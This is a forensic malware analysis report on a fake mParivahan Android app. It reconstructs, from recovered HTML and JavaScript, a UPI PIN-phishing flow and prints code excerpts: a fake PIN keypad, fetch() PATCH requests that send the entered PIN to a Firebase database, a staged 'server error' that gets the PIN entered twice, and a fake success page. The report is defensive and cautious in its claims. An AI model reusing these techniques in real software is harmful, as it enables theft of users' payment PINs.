# UPI PIN Collection Analysis – mParivahan Android Application

## 1. Objective

This analysis examines the UPI payment interface and PIN-handling logic recovered from the second-stage mParivahan application.

The objective is to document how the application presents the payment flow, collects PIN input, handles successive submissions, and constructs Firebase requests containing the submitted values.

The analysis is based on static examination of the recovered HTML and JavaScript resources. No real payment or live PIN submission was performed as part of this analysis.

## 2. Evidence Sources

| Evidence | Location |
|---|---|
| PIN interface | `output/ioc-hunt/stage2/assets/pin.html` |
| Payment selection interface | `output/ioc-hunt/stage2/assets/paytm.html` |
| Payment method interface | `output/ioc-hunt/stage2/assets/method.html` |
| Final payment interface | `output/ioc-hunt/stage2/assets/final.html` |
| Firebase references | `output/firebase_static_hits.txt` |
| Recovered APK | `output/recovered_payload.apk` |

Second-stage package: `com.messege.mp`

## 3. Payment Interface and Navigation

The recovered `method.html` contains a payment-method selection function.

### Code excerpt

```javascript
function selectMethod(method) {
    event.target.closest('button').style.transform = 'scale(0.95)';

    document.getElementById('loadingScreen').style.display = 'flex';

    setTimeout(() => {
        if (method === 'UPI') {
            window.location.href = 'paytm.html';
        } else if (method === 'Card') {
            window.location.href = 'card.html';
        }
    }, 1000);
}
```

### Logic explanation

1. The selected payment button receives visual feedback.
2. A loading screen is displayed.
3. The code checks the selected payment method.
4. UPI selection navigates to `paytm.html`.
5. Card selection navigates to `card.html`.

The recovered `paytm.html` contains a `showPopup()` function that redirects to `pin.html`.

### Code excerpt

```javascript
function showPopup() {
    // Existing popup handling

    window.location.href = "pin.html";
}
```

### Forensic significance

The recovered resources establish a sequence connecting payment-method selection to a PIN-entry interface.

The exact user interaction and timing depend on the page's surrounding interface and event handlers.

## 4. PIN Input Interface

The recovered `pin.html` presents a custom UPI-style numeric keypad.

The interface displays:
- A UPI logo.
- A payment amount of ₹1.00.
- The displayed recipient name mParivahan.
- An ENTER UPI PIN prompt.
- A numeric keypad.
- A visual indicator that masks entered digits.

### 4.1 JavaScript variables

```javascript
let enteredNumbers = [];
let DeviceId = "{DEVICE_ID_MY_PROJECT}";
let allPins = [];
```

### Logic explanation

- `enteredNumbers` stores the digits currently entered by the user.
- `DeviceId` is used when constructing the Firebase database path.
- `allPins` stores the PIN entries collected during the current page session.

The recovered HTML contains a placeholder for `DeviceId`. Its actual runtime substitution was not established from this HTML excerpt.

### 4.2 Numeric input

```javascript
function enterNumber(num) {
    if (enteredNumbers.length < 6) {
        enteredNumbers.push(num);
        updateDisplay();

        if (enteredNumbers.length === 6) {
            setTimeout(submitData, 300);
        }
    }
}
```

### Logic explanation

1. The function checks whether fewer than six digits have been entered.
2. The supplied digit is appended to `enteredNumbers`.
3. The display is refreshed.
4. Once six digits have been entered, `submitData()` is called after a 300 ms delay.

The page also implements a delete function that removes the last entered digit.

### 4.3 Visual PIN masking

```javascript
for (let i = 0; i < 6; i++) {
    let span = document.createElement("span");

    span.textContent =
        (enteredNumbers[i] !== undefined) ? "•" : "";

    display.appendChild(span);
}
```

### Logic explanation

The interface displays a bullet for every entered digit instead of displaying the actual numeric value.

This is visual masking within the page. It does not prevent the JavaScript application from accessing the underlying digits.

## 5. PIN Validation

The submission function checks whether the entered PIN contains four or six digits.

### Code excerpt

```javascript
if (!(enteredNumbers.length === 4 ||
      enteredNumbers.length === 6)) {

    showPopup("Enter valid 4 or 6 digit PIN", true, false);
    setTimeout(hidePopup, 1500);

    return;
}
```

### Logic explanation

- Four-digit and six-digit entries are accepted.
- Other lengths trigger an error message.
- Invalid input is not submitted through this branch.

Although six-digit input triggers automatic submission, the keypad also provides a manual submission control. This allows the four-digit validation path to be reached.

## 6. First PIN Submission

The first submission occurs when `allPins` is empty.

### Code excerpt

```javascript
let pin = enteredNumbers.join('');

if (allPins.length === 0) {

    allPins.push(pin);

    showPopup("Processing...");

    fetch(firebaseUrl, {
        method: "PATCH",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            upiPin: pin
        })
    })
}
```

### Logic explanation

1. The entered digits are joined into a string.
2. The first PIN value is added to `allPins`.
3. A processing popup is displayed.
4. A Firebase PATCH request is constructed.
5. The request body contains a JSON object with the field `upiPin`.

The recovered resource constructs the Firebase destination using the device-specific database path.

### Forensic significance

This is direct static evidence that the application contains logic designed to submit the entered PIN value to a Firebase Realtime Database record.

It is stronger evidence than a simple occurrence of a PIN-related string because the source constructs an HTTP request containing the entered value.

## 7. Programmatically Displayed Error and PIN Re-entry

After the first submission, the source executes the following logic:

```javascript
.then(() => {
    setTimeout(() => {

        showPopup(
            "Server error, please enter PIN again",
            true,
            false
        );

        enteredNumbers = [];
        updateDisplay();

        setTimeout(hidePopup, 1500);

    }, 1200);
});
```

### Logic explanation

1. The first request's promise resolves.
2. A delay of approximately 1.2 seconds is introduced.
3. A server-error message is displayed.
4. The current PIN input is cleared.
5. The PIN display is refreshed.
6. The popup is hidden after another delay.

### Forensic interpretation

The error message and input reset are explicitly implemented in the client-side JavaScript.

The code does not inspect the HTTP response status before displaying this message. A resolved `fetch()` promise does not necessarily mean the HTTP response was successful.

Therefore, this behaviour should be described as a programmatically displayed error rather than a verified server-side failure.

## 8. Second PIN Submission

The source handles subsequent submissions through the `else` branch.

### Code excerpt

```javascript
else {

    allPins.push(pin);

    let finalPins = allPins.join(',');

    showPopup("Processing...");

    fetch(firebaseUrl, {
        method: "PATCH",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            upiPin: finalPins
        })
    })
}
```

### Logic explanation

1. The second entered value is appended to `allPins`.
2. The stored values are combined into a comma-separated string.
3. The combined value is assigned to `finalPins`.
4. A second Firebase PATCH request is constructed.
5. The request body contains the combined value under `upiPin`.

The second request therefore contains both successive entries rather than only the latest entry.

### Forensic significance

The code establishes a deliberate two-submission sequence in which the first entry is retained and a combined value is submitted during the second request.

This behaviour is consistent with a PIN collection workflow that prompts the user to enter the PIN again.

It does not establish that both values were successfully stored by Firebase.

## 9. Final Payment Interface

After the second request's promise resolves, the code redirects the page:

```javascript
.then(() => {
    setTimeout(() => {
        window.location.href = "final.html";
    }, 1200);
});
```

The recovered `final.html` displays:
- A payment-success message.
- A generated transaction ID.
- An amount of ₹1.00.
- A success status.
- A message promising login credentials.

### Transaction ID generation

```javascript
function generateTransactionId() {
    const prefix = 'MVR-';

    const randomNum =
        Math.floor(100000 + Math.random() * 900000);

    return prefix + randomNum;
}
```

### Logic explanation

The transaction ID is generated locally using JavaScript's `Math.random()`.

The recovered code does not establish that this identifier came from a payment gateway or a verified financial transaction.

The success screen is therefore evidence of a locally generated payment-confirmation interface, not proof of a genuine UPI transaction.

## 10. Observed Static Behaviour Sequence

The recovered source supports the following sequence:

1. Payment method selection.
2. Navigation to the payment interface.
3. Navigation to the custom PIN-entry page.
4. Entry of a four-digit or six-digit PIN.
5. First PIN submission through a Firebase PATCH request.
6. Client-side server-error message.
7. Clearing of the input field.
8. Request for PIN re-entry.
9. Second PIN submission containing both entries.
10. Navigation to the final payment-success interface.

This sequence is reconstructed from the static source code. It is not an observed execution trace.

## 11. Key Findings

| ID | Finding | Evidence |
|---|---|---|
| UPI-01 | Custom PIN-entry interface | `pin.html` |
| UPI-02 | Four- and six-digit PIN validation | `submitData()` |
| UPI-03 | Automatic submission after six digits | `enterNumber()` |
| UPI-04 | Visual masking of entered digits | `updateDisplay()` |
| UPI-05 | First PIN value included in Firebase PATCH body | `submitData()` |
| UPI-06 | Client-side error message and input reset | First submission callback |
| UPI-07 | Second submission combines both PIN entries | `allPins.join(',')` |
| UPI-08 | Final payment-success interface | `final.html` |
| UPI-09 | Transaction ID generated locally | `generateTransactionId()` |

## 12. Limitations

- The analysis is based on recovered static HTML and JavaScript.
- No real UPI PIN was entered or transmitted during this investigation.
- No successful Firebase write was established from the source excerpts alone.
- The runtime value of the `DeviceId` placeholder was not established.
- No genuine payment-gateway confirmation was identified in the reviewed code.
- The locally generated transaction ID does not establish a genuine transaction.
- The recovered code does not prove that a victim's PIN was successfully collected or misused.
- The application’s runtime behaviour has not been independently observed.

## 13. Conclusion

Static examination of the recovered second-stage application identifies a custom UPI-style PIN collection interface.

The source accepts four-digit or six-digit input, visually masks the entered digits, and constructs Firebase PATCH requests containing the submitted value under the field `upiPin`.

The first submission triggers a client-side error message and clears the input. A subsequent submission combines both entered values and constructs another Firebase request before redirecting to a locally generated payment-success interface.

These findings provide strong static evidence of a PIN collection and remote-submission capability. They do not independently establish successful PIN exfiltration, a genuine UPI transaction, financial loss, or successful use of collected credentials.

This report documents the observed source-code logic and its forensic significance without claiming unverified runtime outcomes.